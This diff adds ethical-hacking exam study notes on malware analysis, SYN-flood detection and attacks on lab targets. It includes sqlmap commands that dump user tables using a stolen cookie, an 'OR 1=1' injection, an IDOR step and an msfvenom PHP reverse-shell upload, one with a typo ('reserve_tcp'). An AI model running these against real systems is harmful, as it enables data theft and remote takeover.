@@ -77,6 +77,56 @@ cd /
 find .-name imroot.txt
 cat path/imroot.txt
 
-#010 
+#010 Malware
+ELF file use Detect It Easy (DIE)
+Run *.exe
+Upload target file, click open now in scanned all
+see entry point
+Find Portable Executable (PE) Information of Malware Executable File
+upload file, open header and you see entry point adress
+
+#011 DDos
+open *.pcapng file
+Statistics IPv4 --> Source and Destination --> Then you can apply the filter
+tcp.flags.syn == 1 and tcp.flags.ack == 0
+you see high number of packets send to victim ip and the answers
+
+#012 SQL Injection
+log in the website
+go to profile, right click and inspect and console type "document.cookie" you get the value
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value;" --dbs
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value; ui-tabs-1=0" -D moviescope --tables
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="value; ui-tabs-1=0" -D moviescope -T user-Login --dump
+
+#013 Exploit Website
+nmap -sV --script=http-enum target IP
+find input parameter with burp
+intercept with parameter 1 oder 1 OR 1=1 #
+safe file in Burp als *.txt
+sqlmap -r txt from Burp --dbs
+sqlmap -r txt from Burp -D database name --tables
+sqlmap -r txt from Burp -D database name -T table name --columns
+sqlmap -r txt from Burp -D database name -T table name --dump-all
+login to page and change url parameter page_id=1 to page_id=84
+
+#014 Vuln Research DVWA Upload/File inclusion
+Scan DVWA with Zapp
+msfconsole 
+msfvenom -p php/meterpreter/reserve_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php
+use exploit/multi/handler or use 30
+set payload php/meterpreter/reverse_tcp
+Set LHOST 
+Upload file exploit.php
+open terminal run
+browser you get meterpreter session
+type ls an get the files
+
+
+
+
+
+
+
+
 
 
